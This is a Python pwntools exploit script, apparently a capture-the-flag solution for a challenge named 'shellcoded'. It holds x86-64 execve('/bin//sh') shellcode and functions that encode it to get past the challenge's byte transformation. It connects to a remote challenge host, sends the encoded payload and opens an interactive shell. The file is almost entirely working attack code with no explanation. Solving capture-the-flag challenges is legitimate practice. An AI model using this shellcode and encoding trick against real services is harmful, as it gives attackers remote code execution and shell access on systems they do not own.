from pwn import *


#shellcode = "12345678"

#output = "115191=1"


def encrypt(shellcode):
	output = ""
	for i in range(len(shellcode)):
		if(ord(shellcode[i]) & 1 == 1):
			v6 = 1
		else:
			v6 = -1
		mul = v6*i
		output += chr(mul+ord(shellcode[i]))
	return output


def decrypt(encode):
	shellcode = ""
	for i in range(len(encode)):
		if(ord(encode[i]) %2 == 0  and i%2 == 0 ):
			shellcode += chr(ord(encode[i]) + i)
		elif(ord(encode[i]) %2 == 0  and i%2 == 1 ):
			shellcode += chr(ord(encode[i]) - i)
		elif(ord(encode[i]) %2 == 1  and i%2 == 0 ):
			shellcode += chr(ord(encode[i]) - i)
		elif(ord(encode[i]) %2 == 1  and i%2 == 1 ):
			shellcode += chr(ord(encode[i]) + i)
		
	return shellcode

def genpayload(shellcode):
	output = ""
	for i in range(len(shellcode)):
		tmp = output
		for j in range(20, 200):
			tmp += chr(j)
			if(encrypt(tmp) == shellcode[:i+1]):
				output += chr(j)
				break
			else:
				tmp = output
	return output



r = remote("challenge.ctf.games", 32383)
#r = process("./shellcoded")
#gdb.attach(r)

r.recv()

#shellcode = "\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05"
eshellcode = "\x80\x78\x1b\x6a\x44\x36\xba\x57\x40\xc4\x25\x6d\x5d\x7b\x21\x3e\x63\x79\x41\x67\x4b\x5d\x73\xdd\x30\x4a\xb8\xcb\x1f\x85\x72\x24"
eshellcode = "\x48\x32\xbe\x53\x44\xc0\x29\x69\x61\x77\x25\x3a\x67\x75\x45\x63\x4f\x59\x77\xd9\x34\x46\xbc\xc7\x23\x28\xeb"
#eshellcode = genpayload(shellcode)
r.sendline(eshellcode)

r.interactive()


